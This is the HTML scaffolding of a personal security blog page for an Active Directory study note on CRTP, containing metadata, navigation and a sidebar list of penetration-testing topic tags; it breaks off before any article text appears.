<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="desktop" > 
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-84TPQBH5EH"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-84TPQBH5EH');
</script>
<!-- End Google Analytics -->

  
  

  
  <title>crtp-study-note | ❀言わぬが花❀</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <meta name="description" content="01 DACLacl分为两种类型，DACL 和 SACL DACL  控制访问权限 ACE包含（拒绝访问&#x2F;允许） 直接决定权限  SACL  日志&#x2F;审计记录 行为记录 失败&#x2F;成功的行为记录  1.用户多个权限场景的DACL匹配以下为例，当有两个 用户A 用户B     A用户 B用户    Andrew Jane   GROUP-A GROUP-A   GROUP-B">
<meta property="og:type" content="article">
<meta property="og:title" content="crtp-study-note">
<meta property="og:url" content="http://example.com/2024/12/20/crtp-study-note/index.html">
<meta property="og:site_name" content="❀言わぬが花❀">
<meta property="og:description" content="01 DACLacl分为两种类型，DACL 和 SACL DACL  控制访问权限 ACE包含（拒绝访问&#x2F;允许） 直接决定权限  SACL  日志&#x2F;审计记录 行为记录 失败&#x2F;成功的行为记录  1.用户多个权限场景的DACL匹配以下为例，当有两个 用户A 用户B     A用户 B用户    Andrew Jane   GROUP-A GROUP-A   GROUP-B">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/wpimages/2025/crtp-study-note/background.jpg">
<meta property="article:published_time" content="2024-12-20T11:40:41.000Z">
<meta property="article:modified_time" content="2025-05-19T13:07:20.986Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="AD">
<meta property="article:tag" content="crtp">
<meta property="article:tag" content="note">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/wpimages/2025/crtp-study-note/background.jpg">
  
    <link rel="alternate" href="/atom.xml" title="❀言わぬが花❀" type="application/atom+xml">
  
  
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 7.1.1"></head>

<script>



</script>
<body>
  
  
    
<div id="banner" class="">
  <img src="/images/backgroup.jpg" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="  ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>❀言わぬが花❀ </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
    </a>
    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
      </a>
    
    <div id="nav-menu-btn" class="nav-icon">
      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
    
      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=/images/avatar.jpg></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">Flower </div>
      <div class="dot"></div>
      <div class="subtitle">Hi Im Flower </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://store.steampowered.com" title="Steam"><i class="fa-brands fa-steam"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com" title="GitHub"><i class="fa-brands fa-github"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
    
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Tags</h3>
      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/2FA/" rel="tag">2FA</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AD/" rel="tag">AD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AS-REQ-ST/" rel="tag">AS-REQ ST</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AllowedtoAct/" rel="tag">AllowedtoAct</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/C/" rel="tag">C#</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-36467/" rel="tag">CVE-2024-36467</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-42327/" rel="tag">CVE-2024-42327</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Command-injection/" rel="tag">Command injection</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Configuration/" rel="tag">Configuration</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/DACL/" rel="tag">DACL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/DLL/" rel="tag">DLL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ESC1/" rel="tag">ESC1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ESC4/" rel="tag">ESC4</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ForceChangePassword/" rel="tag">ForceChangePassword</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Forensic/" rel="tag">Forensic</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GMSA/" rel="tag">GMSA</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GPO/" rel="tag">GPO</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GSSAPI/" rel="tag">GSSAPI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Gbbion/" rel="tag">Gbbion</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GenericAll/" rel="tag">GenericAll</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/HKLM/" rel="tag">HKLM</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/IDOR/" rel="tag">IDOR</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Jenkins/" rel="tag">Jenkins</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Kubernetes/" rel="tag">Kubernetes</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/LFR/" rel="tag">LFR</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/NTHASH/" rel="tag">NTHASH</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Nmap/" rel="tag">Nmap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Nodeport/" rel="tag">Nodeport</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/OU/" rel="tag">OU</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PKINIT/" rel="tag">PKINIT</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PSReadLine/" rel="tag">PSReadLine</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PasstheCert/" rel="tag">PasstheCert</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PetitPotam/" rel="tag">PetitPotam</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Powershell/" rel="tag">Powershell</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Pseudorandom/" rel="tag">Pseudorandom</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/RECYCLE-BIN/" rel="tag">RECYCLE.BIN</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Roundcube-Webmail/" rel="tag">Roundcube Webmail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Rubeus/" rel="tag">Rubeus</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SPN/" rel="tag">SPN</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SQL-injection/" rel="tag">SQL injection</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SeBackupPrivilege/" rel="tag">SeBackupPrivilege</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SeImpersonatePrivilege/" rel="tag">SeImpersonatePrivilege</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Server-Operators/" rel="tag">Server Operators</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SharPy/" rel="tag">SharPy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Shellcode/" rel="tag">Shellcode</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/TOTP/" rel="tag">TOTP</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Tips/" rel="tag">Tips</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/WriteGPlink/" rel="tag">WriteGPlink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/WriteOwner/" rel="tag">WriteOwner</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Zabbix/" rel="tag">Zabbix</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ansible-vault/" rel="tag">ansible_vault</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/asp/" rel="tag">asp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/aws/" rel="tag">aws</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azure-devops/" rel="tag">azure devops</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azureAD/" rel="tag">azureAD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bbot/" rel="tag">bbot</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/beacon/" rel="tag">beacon</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/blockchain/" rel="tag">blockchain</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bloodhound/" rel="tag">bloodhound</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bookstack/" rel="tag">bookstack</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/browser/" rel="tag">browser</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/brute-rid/" rel="tag">brute-rid</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bypass-AMSI/" rel="tag">bypass AMSI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bypass-kerberos-only/" rel="tag">bypass-kerberos-only</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/c/" rel="tag">c</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cd/" rel="tag">cd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cme/" rel="tag">cme</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/consul/" rel="tag">consul</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/crtp/" rel="tag">crtp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cve/" rel="tag">cve</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/deb/" rel="tag">deb</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/defaultapppool/" rel="tag">defaultapppool</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnsadmin/" rel="tag">dnsadmin</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnschef/" rel="tag">dnschef</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnstools/" rel="tag">dnstools</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dpapi/" rel="tag">dpapi</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/edge/" rel="tag">edge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/efspotato/" rel="tag">efspotato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/esc1/" rel="tag">esc1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/esc14/" rel="tag">esc14</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fifo/" rel="tag">fifo</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/firewall/" rel="tag">firewall</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fishing/" rel="tag">fishing</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/gamepwn/" rel="tag">gamepwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ghost/" rel="tag">ghost</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/github/" rel="tag">github</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/go/" rel="tag">go</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/gpo/" rel="tag">gpo</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/h2/" rel="tag">h2</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/hardhat/" rel="tag">hardhat</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/havoc/" rel="tag">havoc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/impacket-GetUserSPNs/" rel="tag">impacket-GetUserSPNs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/impacket-smbclient/" rel="tag">impacket-smbclient</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/iptables/" rel="tag">iptables</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/iptables-save/" rel="tag">iptables-save</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ispconfig/" rel="tag">ispconfig</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/jar/" rel="tag">jar</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/jwt/" rel="tag">jwt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/k8s/" rel="tag">k8s</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/kcd/" rel="tag">kcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/krbrelayx/" rel="tag">krbrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/kube-proxy/" rel="tag">kube-proxy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/laps/" rel="tag">laps</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ldap/" rel="tag">ldap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ldaps/" rel="tag">ldaps</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/limesurvey/" rel="tag">limesurvey</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/logon-script/" rel="tag">logon script</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/lsaquery/" rel="tag">lsaquery</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mail/" rel="tag">mail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/merge/" rel="tag">merge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/msDS-KeyCredentialLink/" rel="tag">msDS-KeyCredentialLink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mssql/" rel="tag">mssql</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/neo4j/" rel="tag">neo4j</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nginx/" rel="tag">nginx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/no-preAuth/" rel="tag">no-preAuth</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nodejs/" rel="tag">nodejs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/note/" rel="tag">note</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ntlmrelayx/" rel="tag">ntlmrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pfishing/" rel="tag">pfishing</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pfx/" rel="tag">pfx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/poc/" rel="tag">poc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pod/" rel="tag">pod</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pods/" rel="tag">pods</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/postgresql/" rel="tag">postgresql</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/powershell/" rel="tag">powershell</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/powerview/" rel="tag">powerview</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pre2k/" rel="tag">pre2k</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/psexec/" rel="tag">psexec</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pswa/" rel="tag">pswa</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pyjail/" rel="tag">pyjail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rbcd/" rel="tag">rbcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/remote-potato/" rel="tag">remote-potato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rootkit/" rel="tag">rootkit</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rosating/" rel="tag">rosating</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rpcclient/" rel="tag">rpcclient</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/runascs/" rel="tag">runascs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/s3/" rel="tag">s3</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sercerts/" rel="tag">sercerts</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/service/" rel="tag">service</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sherlocks/" rel="tag">sherlocks</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/shm/" rel="tag">shm</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sliver-ticketer/" rel="tag">sliver ticketer</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smb/" rel="tag">smb</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smb-krbrelayx/" rel="tag">smb_krbrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smbmap/" rel="tag">smbmap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/splunk/" rel="tag">splunk</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sqlcmd/" rel="tag">sqlcmd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sqli/" rel="tag">sqli</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sssd/" rel="tag">sssd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ssti/" rel="tag">ssti</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/study/" rel="tag">study</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/svn/" rel="tag">svn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/symlink/" rel="tag">symlink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/teampass/" rel="tag">teampass</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/tgt/" rel="tag">tgt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/username-anarchy/" rel="tag">username-anarchy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wapt/" rel="tag">wapt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/websocket/" rel="tag">websocket</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/winlogon/" rel="tag">winlogon</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ysoserial-net/" rel="tag">ysoserial.net</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/zip/" rel="tag">zip</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" 